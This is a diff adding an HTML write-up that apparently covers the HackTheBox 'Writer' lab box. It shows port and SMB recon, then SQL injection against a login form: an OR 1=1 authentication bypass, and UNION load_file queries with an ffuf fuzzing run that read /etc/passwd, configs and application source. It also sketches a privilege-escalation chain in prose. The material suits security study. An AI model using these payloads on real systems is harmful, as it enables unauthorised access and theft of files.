@@ -1,0 +1,1063 @@
+I"��<h2 id="summary">Summary</h2>
+
+<p>10.129.212.12</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Port</th>
+      <th>State</th>
+      <th>Service</th>
+      <th>Version</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22/tcp</td>
+      <td>open</td>
+      <td>ssh</td>
+      <td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.2</td>
+    </tr>
+    <tr>
+      <td>80/tcp</td>
+      <td>open</td>
+      <td>http</td>
+      <td>Apache httpd 2.4.41</td>
+    </tr>
+    <tr>
+      <td>139/tcp</td>
+      <td>open</td>
+      <td>netbios-ssn</td>
+      <td>Samba smbd 4.6.2</td>
+    </tr>
+    <tr>
+      <td>445/tcp</td>
+      <td>open</td>
+      <td>netbios-ssn</td>
+      <td>Samba smbd 4.6.2</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Writer starts with directory fuzzing, locating a login page, then finding a vulnerable SQL query that is injectable to both bool injection for auth bypass and union injection for dumping data with the Load_File function. From there we can load the source of the web app and figure out it’s vulnerable to OS Command injection. Once we get a low priv shell as www-data we find creds for the database and logging in to the database gets us Kyle’s hash which as it is a weak password we can crack and, due to password reuse, ssh in as Kyle. From kyle, we can make use of a postfix configuration that includes a group writeable file when an email is sent, edit the file to place a payload to get a shell as John. The John user has write access to the apt config directory, and there is a cron running apt-get update as root that we can exploit for a root shell.</p>
+
+<p>Overall, a fun multistep box, which taught me about the apt pivesc route and improved my SQL injection skills.</p>
+
+<h2 id="initial-recon">Initial Recon</h2>
+
+<p>Use AutoRecon to automate the initial enumeration of the box</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>autorecon <span class="nt">-v</span> 10.129.212.21
+</code></pre></div></div>
+
+<p><img src="assets/writer_screenshots/autorecon.png" alt="autorecon" /></p>
+
+<h2 id="nmap">Nmap</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-vv</span> <span class="nt">--reason</span> <span class="nt">-Pn</span> <span class="nt">-T4</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">--version-all</span> <span class="nt">-A</span> <span class="nt">--osscan-guess</span> <span class="nt">-oN</span> <span class="s2">"/home/tuz/hack/htb/boxes/writer/results/10.129.212.12/scans/_quick_tcp_nmap.txt"</span> <span class="nt">-oX</span> <span class="s2">"/home/tuz/hack/htb/boxes/writer/results/10.129.212.12/scans/xml/_quick_tcp_nmap.xml"</span> 10.129.212.12
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for </span>10.129.212.12
+Host is up, received user-set <span class="o">(</span>0.0098s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-12-12 16:09:26 GMT <span class="k">for </span>35s
+Not shown: 996 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT    STATE SERVICE     REASON         VERSION
+22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d <span class="o">(</span>RSA<span class="o">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwAA7IblnSMXNfqjkkoT+PAk2SPYBRL5gy0K0FQ2XbFGuPk6ImjJLrb0BF6qw3hU/I2V9ARRnn2SvHlz1+lLB0Ie9wkvH1gZfnUBd5X2sOS3vCzYJOBoD+yzJat40YmKx3NLjYCzkMd/KyTGGIH0cdlnROO6eJdnJN1QYMsrM4+QkkrQHtgz5KAk/aE18+1e5toWK1Px+KtVjvPWiD7mTb4J99f79L/5CCI9nUfmjeB8EU9qe3igUQ3zCGVFGUNTA9Vva99kh3SC6YjBe8+9ipFSZFVSqaJoJpZF83Oy2BEPWEb6lgo3cx7FwGH24nT833Y4Urk294/5ym8F3JFxo/FCgtjuYwp5Im1j9oVOGSnECKfC785zZiSu+ubdnxDjvbuRgW34DsKZpbtVvwxs8R/VNE3bSldVLmz5gCwP0Dfaop+Tbn7MW8OJWL6hEQqNiLw3cSBpzPId/EIMO7TMfqVXTfkMtD1yiIlafd3ianGLu+VUpJ3Bg8jk/COUOHj/M<span class="o">=</span>
+|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 <span class="o">(</span>ECDSA<span class="o">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD+ZKRtm6JRYjPO1v8n2nR/cGDBj0Oaydm1VE6rUnvyI6bxfnPCaRjvxDrV3eW5rRXbK/ybC0k5WHtQ9iWogmAU<span class="o">=</span>
+|   256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d <span class="o">(</span>ED25519<span class="o">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBaCZ4ALrn0m103XaA+e+YPrTO2f1hK8mAD5kUxJ7O9L
+80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-title: Story Bank | Writer.HTB
+139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
+445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
+Aggressive OS guesses: Linux 4.15 - 5.6 <span class="o">(</span>95%<span class="o">)</span>, Linux 5.3 - 5.4 <span class="o">(</span>95%<span class="o">)</span>, Linux 2.6.32 <span class="o">(</span>95%<span class="o">)</span>, Linux 5.0 - 5.3 <span class="o">(</span>95%<span class="o">)</span>, Linux 3.1 <span class="o">(</span>95%<span class="o">)</span>, Linux 3.2 <span class="o">(</span>95%<span class="o">)</span>, AXIS 210A or 211 Network Camera <span class="o">(</span>Linux 2.6.17<span class="o">)</span> <span class="o">(</span>94%<span class="o">)</span>, ASUS RT-N56U WAP <span class="o">(</span>Linux 3.4<span class="o">)</span> <span class="o">(</span>93%<span class="o">)</span>, Linux 3.16 <span class="o">(</span>93%<span class="o">)</span>, Linux 5.0 <span class="o">(</span>93%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span><span class="nb">.</span>
+TCP/IP fingerprint:
+OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.92%E<span class="o">=</span>4%D<span class="o">=</span>12/12%OT<span class="o">=</span>22%CT<span class="o">=</span>1%CU<span class="o">=</span>32516%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>T%G<span class="o">=</span>Y%TM<span class="o">=</span>61B61E
+OS:D9%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>106%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10A%TI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>A<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>
+OS:106%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10A%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>A<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M54DST11NW7%O2<span class="o">=</span>M54DST11NW7%
+OS:O3<span class="o">=</span>M54DNNT11NW7%O4<span class="o">=</span>M54DST11NW7%O5<span class="o">=</span>M54DST11NW7%O6<span class="o">=</span>M54DST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>FE88%W2
+OS:<span class="o">=</span>FE88%W3<span class="o">=</span>FE88%W4<span class="o">=</span>FE88%W5<span class="o">=</span>FE88%W6<span class="o">=</span>FE88<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>FAF0%O<span class="o">=</span>M54DNNS
+OS:NW7%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>
+OS:T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%
+OS:S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0
+OS:%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%T<span class="o">=</span>4
+OS:0%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>40%CD<span class="o">=</span>S<span class="o">)</span>
+
+Uptime guess: 17.565 days <span class="o">(</span>since Thu Nov 25 02:36:41 2021<span class="o">)</span>
+Network Distance: 2 hops
+TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>262 <span class="o">(</span>Good luck!<span class="o">)</span>
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: 0s
+| nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
+| Names:
+|   WRITER&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;
+|   WRITER&lt;03&gt;           Flags: &lt;unique&gt;&lt;active&gt;
+|   WRITER&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;
+|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+| Statistics:
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| p2p-conficker: 
+|   Checking <span class="k">for </span>Conficker.C or higher...
+|   Check 1 <span class="o">(</span>port 25163/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Couldn<span class="s1">'t connect)
+|   Check 2 (port 60751/tcp): CLEAN (Couldn'</span>t connect<span class="o">)</span>
+|   Check 3 <span class="o">(</span>port 47607/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Failed to receive data<span class="o">)</span>
+|   Check 4 <span class="o">(</span>port 51813/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Failed to receive data<span class="o">)</span>
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-time: 
+|   <span class="nb">date</span>: 2021-12-12T16:09:59
+|_  start_date: N/A
+
+TRACEROUTE <span class="o">(</span>using port 2702/tcp<span class="o">)</span>
+HOP RTT     ADDRESS
+1   9.12 ms 10.10.14.1
+2   9.61 ms 10.129.212.12
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sun Dec 12 16:10:01 2021 -- 1 IP address (1 host up) scanned in 35.40 seconds</span>
+</code></pre></div></div>
+
+<p>Nmap shows the box is probably Ubuntu from the services banners, we can find out which release by looking up the services versions on launchpad.</p>
+
+<p><img src="assets/writer_screenshots/launchpad_openssh_version.png" alt="launchpad" /></p>
+
+<p>Launchpad shows us this version of openssh is for Ubuntu Focal, also known as 20.04.</p>
+
+<p>I will enumerate RPC / SMB first, as it’s quick and easy.</p>
+
+<h3 id="rpc-enumeration">RPC Enumeration</h3>
+
+<p>Using enum4linux we can enumerate the RPC.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux <span class="nt">-a</span> <span class="nt">-M</span> <span class="nt">-l</span> <span class="nt">-d</span> 10.129.212.12 2&gt;&amp;1
+</code></pre></div></div>
+
+<p>This will produce quite a lot of information, the most interesting for us being user information.</p>
+
+<p><img src="assets/writer_screenshots/enum4linux.png" alt="enum4linux" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user:[kyle] rid:[0x3e8]
+ User Name   : kyle
+ Full Name   : Kyle Travis
+ Home Drive  : <span class="se">\\</span>writer<span class="se">\k</span>yle
+</code></pre></div></div>
+
+<p>This also shows Account Lockout is off, so we could try and brute force this user’s password through SMB or ssh with crackmapexec or hydra.</p>
+
+<h3 id="smb-enumeration">SMB Enumeration</h3>
+
+<p>Using smbmap we can find available shares.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.129.212.12
+</code></pre></div></div>
+
+<p><img src="assets/writer_screenshots/smbmap.png" alt="smbmap" /></p>
+
+<p>smbmap shows us we don’t have unauthenticated access to any of the SMB shares.</p>
+
+<p>We’ll keep this in mind until we can find some users credentials.</p>
+
+<p>Until then, we’ll move on to the web server on port 80.</p>
+
+<h3 id="web-server-enumeration">Web Server Enumeration</h3>
+
+<p>Let’s navigate to the index page of the web server.</p>
+
+<p><img src="assets/writer_screenshots/indexpage.png" alt="indexpage" /></p>
+
+<p>Seems to be a writer’s blog.</p>
+
+<p><img src="assets/writer_screenshots/aboutpage.png" alt="aboutpage" /></p>
+
+<p>The about page shows a possible username of admin@writer.htb</p>
+
+<p>Nothing else useful from using the website or looking at the source, lets fuzz for directories with gobuster.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.129.212.12/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt <span class="nt">-t</span> 50 <span class="o">&gt;</span> tcp_80_http_gobuster_medium.txt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.129.212.12/
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 50
+<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2021/12/12 18:48:18 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/logout               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 208] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.129.212.12/]
+/contact              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 4905]
+/about                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 3522]
+/static               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.129.212.12/static/]
+/.                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 11971]
+/dashboard            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 208] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.129.212.12/]
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]
+/administrative       <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1443]
+<span class="o">===============================================================</span>
+2021/12/12 18:49:19 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+
+<p>The output shows an administrative page, let’s poke at that.</p>
+
+<p><img src="assets/writer_screenshots/administrative.png" alt="Administrative" /></p>
+
+<p>No easily guessable creds get us logged in, let’s try for SQL injection. We will use burp suite to make it easier.</p>
+
+<p>Capture a login request and send it to repeater, so we can easily modify it.</p>
+
+<p><img src="assets/writer_screenshots/burploginrequest.png" alt="burploginrequest" /></p>
+
+<p>The post request for the login looks like <code class="language-plaintext highlighter-rouge">uname=admin&amp;password=admin</code></p>
+
+<p>We’ll try a classic auth bypass SQL injection <code class="language-plaintext highlighter-rouge">admin' OR 1=1 -- -</code></p>
+
+<p>Let’s url encode it for the post request <code class="language-plaintext highlighter-rouge">uname=admin'+OR+1%3d1+--+-&amp;password=admin</code> and send it with burp.</p>
+
+<p><img src="assets/writer_screenshots/burp_sql_injection_auth_bypass.png" alt="burp_sql_injection_auth_bypass" /></p>
+
+<p>We get a 200 OK and a redirection to the dashboard</p>
+
+<p>This works because the SQL server processing our request compares the username and password to known strings or hashes. We trick it by escaping the query with the <code class="language-plaintext highlighter-rouge">'</code>, giving it a logic operaton that is always true <code class="language-plaintext highlighter-rouge">1=1</code> and commenting out the rest of the query with MySQL comments <code class="language-plaintext highlighter-rouge">-- -</code>.</p>
+
+<p><img src="assets/writer_screenshots/burp_auth_bypass_redirect.png" alt="burp_auth_bypass_redirect" /></p>
+
+<p>We can show this in browser by right-clicking and selecting ‘Show response in browser’, copying the link and pasting it in the browser. Or we could copy our SQL Injection string into the user login field with a password.</p>
+
+<p>We come to the dashboard.
+<img src="assets/writer_screenshots/dashboard.png" alt="dashboard" /></p>
+
+<p>On the dashboard stories page, we can add a story, and it lets us upload an image.</p>
+
+<p><img src="assets/writer_screenshots/upload_image.png" alt="upload_image" /></p>
+
+<p>But trying to upload a shell and mess with the magic bytes or file extension doesn’t help us here.</p>
+
+<p>As we have SQL injection for the auth bypass, let’s test for other types of SQL injection. Sometimes we can test how many columns are returned in the query with the <code class="language-plaintext highlighter-rouge">ORDER BY</code> statement, but that isn’t working here. We can instead use generic union null queries and inspect the response.</p>
+
+<p>We can increase the amount of NULL’s in the query until we get unexpected behaviour, in this case we get logged in.</p>
+
+<p><code class="language-plaintext highlighter-rouge">test' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL; -- -</code></p>
+
+<p><img src="assets/writer_screenshots/burp_union_sql_injection.png" alt="burp_union_sql_injection" /></p>
+
+<p>Now we’ve got Union Injection, we can try dumping things. We can already log in, so let’s try the MySQL <code class="language-plaintext highlighter-rouge">LoadFile</code> function.</p>
+
+<p><code class="language-plaintext highlighter-rouge">test' UNION ALL SELECT NULL,load_file('/etc/passwd'),NULL,NULL,NULL,NULL; -- -</code></p>
+
+<p><img src="assets/writer_screenshots/burp_load_file_injection.png" alt="burp_load_file_injection" /></p>
+
+<p>Now let’s fuzz for what else we can load.</p>
+
+<p><code class="language-plaintext highlighter-rouge">ffuf -u http://10.129.212.12/administrative -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "uname=test'+UNION+ALL+SELECT+NULL,load_file('FUZZ'),NULL,NULL,NULL,NULL%3b+--+&amp;password=test" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 1295 &gt; load_file_fuzzing.txt</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/hosts              <span class="o">[</span>Status: 200, Size: 1512, Words: 301, Lines: 42, Duration: 66ms]
+/etc/apache2/apache2.conf <span class="o">[</span>Status: 200, Size: 8758, Words: 1221, Lines: 260, Duration: 122ms]
+/etc/aliases            <span class="o">[</span>Status: 200, Size: 1342, Words: 290, Lines: 35, Duration: 126ms]
+/etc/fstab              <span class="o">[</span>Status: 200, Size: 2002, Words: 363, Lines: 45, Duration: 151ms]
+/etc/hosts.deny         <span class="o">[</span>Status: 200, Size: 2018, Words: 407, Lines: 50, Duration: 152ms]
+/etc/passwd             <span class="o">[</span>Status: 200, Size: 3332, Words: 298, Lines: 71, Duration: 159ms]
+/etc/mtab               <span class="o">[</span>Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 74ms]
+/etc/hosts.allow        <span class="o">[</span>Status: 200, Size: 1714, Words: 361, Lines: 43, Duration: 186ms]
+/etc/crontab            <span class="o">[</span>Status: 200, Size: 2373, Words: 460, Lines: 55, Duration: 173ms]
+/etc/issue              <span class="o">[</span>Status: 200, Size: 1317, Words: 284, Lines: 35, Duration: 173ms]
+/etc/passwd             <span class="o">[</span>Status: 200, Size: 3332, Words: 298, Lines: 71, Duration: 81ms]
+/etc/network/interfaces <span class="o">[</span>Status: 200, Size: 1354, Words: 288, Lines: 38, Duration: 93ms]
+/etc/lsb-release        <span class="o">[</span>Status: 200, Size: 1403, Words: 282, Lines: 37, Duration: 147ms]
+/etc/networks           <span class="o">[</span>Status: 200, Size: 1382, Words: 290, Lines: 35, Duration: 169ms]
+/etc/profile            <span class="o">[</span>Status: 200, Size: 1944, Words: 424, Lines: 60, Duration: 128ms]
+/etc/ssh/ssh_config     <span class="o">[</span>Status: 200, Size: 2894, Words: 524, Lines: 85, Duration: 89ms]
+/etc/ssh/ssh_host_dsa_key.pub <span class="o">[</span>Status: 200, Size: 1892, Words: 282, Lines: 34, Duration: 88ms]
+/etc/resolv.conf        <span class="o">[</span>Status: 200, Size: 2016, Words: 377, Lines: 51, Duration: 115ms]
+/etc/mysql/my.cnf       <span class="o">[</span>Status: 200, Size: 2295, Words: 402, Lines: 62, Duration: 194ms]
+/etc/samba/smb.conf     <span class="o">[</span>Status: 200, Size: 10623, Words: 1787, Lines: 281, Duration: 134ms]
+/proc/cpuinfo           <span class="o">[</span>Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 61ms]
+/proc/ioports           <span class="o">[</span>Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 90ms]
+/proc/meminfo           <span class="o">[</span>Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 68ms]
+/proc/modules           <span class="o">[</span>Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 82ms]
+/etc/ssh/sshd_config    <span class="o">[</span>Status: 200, Size: 4627, Words: 575, Lines: 157, Duration: 117ms]
+/proc/mounts            <span class="o">[</span>Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 110ms]
+/proc/self/net/arp      <span class="o">[</span>Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 103ms]
+/proc/version           <span class="o">[</span>Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 107ms]
+/proc/swaps             <span class="o">[</span>Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 112ms]
+/proc/stat              <span class="o">[</span>Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 128ms]
+/proc/filesystems       <span class="o">[</span>Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 144ms]
+/proc/interrupts        <span class="o">[</span>Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 169ms]
+/var/log/dpkg.log       <span class="o">[</span>Status: 200, Size: 1291, Words: 280, Lines: 33, Duration: 72ms]
+/var/log/wtmp           <span class="o">[</span>Status: 200, Size: 59803, Words: 283, Lines: 75, Duration: 54ms]
+/var/run/utmp           <span class="o">[</span>Status: 200, Size: 2443, Words: 280, Lines: 33, Duration: 72ms]
+/var/log/dmesg          <span class="o">[</span>Status: 200, Size: 127326, Words: 21037, Lines: 1668, Duration: 199ms]
+/var/log/lastlog        <span class="o">[</span>Status: 200, Size: 293878, Words: 280, Lines: 33, Duration: 212ms]
+</code></pre></div></div>
+
+<p>We can read the apache2 config file, maybe we can read the deafult site config aswell.</p>
+
+<p><code class="language-plaintext highlighter-rouge">test' UNION ALL SELECT NULL,load_file('/etc/apache2/sites-enabled/000-default.conf'),NULL,NULL,NULL,NULL; -- -</code></p>
+
+<pre><code class="language-txt"># Virtual host configuration for writer.htb domain
+&lt;VirtualHost *:80&gt;
+        ServerName writer.htb
+        ServerAdmin admin@writer.htb
+        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
+        &lt;Directory /var/www/writer.htb&gt;
+                Order allow,deny
+                Allow from all
+        &lt;/Directory&gt;
+        Alias /static /var/www/writer.htb/writer/static
+        &lt;Directory /var/www/writer.htb/writer/static/&gt;
+                Order allow,deny
+                Allow from all
+        &lt;/Directory&gt;
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        LogLevel warn
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+&lt;/VirtualHost&gt;
+
+# Virtual host configuration for dev.writer.htb subdomain
+# Will enable configuration after completing backend development
+# Listen 8080
+#&lt;VirtualHost 127.0.0.1:8080&gt;
+# ServerName dev.writer.htb
+# ServerAdmin admin@writer.htb
+#
+        # Collect static for the writer2_project/writer_web/templates
+# Alias /static /var/www/writer2_project/static
+# &lt;Directory /var/www/writer2_project/static&gt;
+#  Require all granted
+# &lt;/Directory&gt;
+#
+# &lt;Directory /var/www/writer2_project/writerv2&gt;
+#  &lt;Files wsgi.py&gt;
+#   Require all granted
+#  &lt;/Files&gt;
+# &lt;/Directory&gt;
+#
+# WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env
+# WSGIProcessGroup writer2_project
+# WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py
+#        ErrorLog ${APACHE_LOG_DIR}/error.log
+#        LogLevel warn
+#        CustomLog ${APACHE_LOG_DIR}/access.log combined
+#
+#&lt;/VirtualHost&gt;
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+</code></pre>
+
+<p>Seeing the directory structure makes me think of a Flask app. Lets try the defualt <code class="language-plaintext highlighter-rouge">__init.py__</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">test' UNION ALL SELECT NULL,load_file('/var/www/writer.htb/writer/__init__.py'),NULL,NULL,NULL,NULL; -- -</code></p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Welcome</span> <span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span>
+<span class="kn">from</span> <span class="nn">mysql.connector</span> <span class="kn">import</span> <span class="n">errorcode</span>
+<span class="kn">import</span> <span class="nn">mysql.connector</span>
+<span class="kn">import</span> <span class="nn">urllib.request</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">PIL</span>
+<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span><span class="p">,</span> <span class="n">UnidentifiedImageError</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">,</span><span class="n">static_url_path</span><span class="o">=</span><span class="s">''</span><span class="p">,</span><span class="n">static_folder</span><span class="o">=</span><span class="s">'static'</span><span class="p">,</span><span class="n">template_folder</span><span class="o">=</span><span class="s">'templates'</span><span class="p">)</span>
+
+<span class="c1">#Define connection for database
+</span><span class="k">def</span> <span class="nf">connections</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
